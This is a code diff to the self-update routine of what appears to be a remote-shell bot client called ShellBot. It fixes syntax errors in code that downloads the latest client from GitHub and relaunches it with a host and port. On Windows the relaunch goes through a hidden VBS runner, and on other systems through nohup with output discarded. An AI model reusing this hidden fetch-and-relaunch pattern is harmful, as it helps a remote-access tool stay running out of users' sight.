@@ -64,7 +64,7 @@ import os, sys, urllib.request, tempfile
 def getURL(owner, repo, name):
     import json
 
-    response = urllib.request.urlopen('https://api.github.com/repos/%s/%s/releases/latest'.%(owner, repo))
+    response = urllib.request.urlopen('https://api.github.com/repos/%s/%s/releases/latest'%(owner, repo))
 
     json_val = json.loads(response.read().decode())
 
@@ -81,19 +81,19 @@ if sys.platform == "win32": os.system("taskkill /PID {pid} /F")
 else: os.system("kill {pid}")
 
 if {frozen}:
-    download(url, "{exe}")
     url = getURL('sayak-brm', 'ShellBot', 'client.exe')
+    download(url, r"{exe}")
 else:
-    download(url, "{arg}")
     url = getURL('sayak-brm', 'ShellBot', 'client.py')
+    download(url, r"{arg}")
 
 if sys.platform == "win32":
-    if {frozen}: os.system("{exe} {host} {port}")
+    if {frozen}: os.system(r"{exe} {host} {port}")
     else:
         runner = 'CreateObject("WScript.Shell").Run WScript.Arguments(0), 0'
-        with open(tempfile.gettempdir() + "/runner.vbs", "w") as f: f.write(runner)
-        os.system(tempfile.gettempdir() + '/runner.vbs "{exe} {arg} {host} {port}"')
-else: os.system("nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &")
+        with open(tempfile.gettempdir() + r"/runner.vbs", "w") as f: f.write(runner)
+        os.system(tempfile.gettempdir() + r'/runner.vbs "{exe} {arg} {host} {port}"')
+else: os.system(r"nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &")
 """.format(pid=os.getpid(), frozen=frozen, host=host, port=port, exe=sys.executable, arg=sys.argv[0])
 
 def selfUpdate():
